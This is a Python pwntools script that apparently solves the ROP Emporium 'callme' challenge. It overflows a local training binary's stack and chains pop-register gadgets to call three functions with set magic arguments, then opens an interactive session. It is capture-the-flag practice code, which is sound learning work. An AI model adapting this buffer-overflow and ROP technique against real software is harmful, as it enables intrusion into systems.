from pwn import * 
 
p = process('./callme') 
elf = ELF('./callme') 
one_addr = elf.plt['callme_one'] 
two_addr = elf.plt['callme_two'] 
three_addr = elf.plt['callme_three'] 
pop_rdi_addr = 0x00000000004009a3 
pop_rsi_rdx_addr = 0x000000000040093d 
payload = 'A'*0x20 + 'A'*0x08 
payload += p64(pop_rdi_addr)+p64(0xdeadbeefdeadbeef)+p64(pop_rsi_rdx_addr)+p64(0xcafebabecafebabe)+p64(0xd00df00dd00df00d)+p64(one_addr) 
payload += p64(pop_rdi_addr)+p64(0xdeadbeefdeadbeef)+p64(pop_rsi_rdx_addr)+p64(0xcafebabecafebabe)+p64(0xd00df00dd00df00d)+p64(two_addr) 
payload += p64(pop_rdi_addr)+p64(0xdeadbeefdeadbeef)+p64(pop_rsi_rdx_addr)+p64(0xcafebabecafebabe)+p64(0xd00df00dd00df00d)+p64(three_addr) 
p.sendlineafter('> ',payload) 
p.interactive()
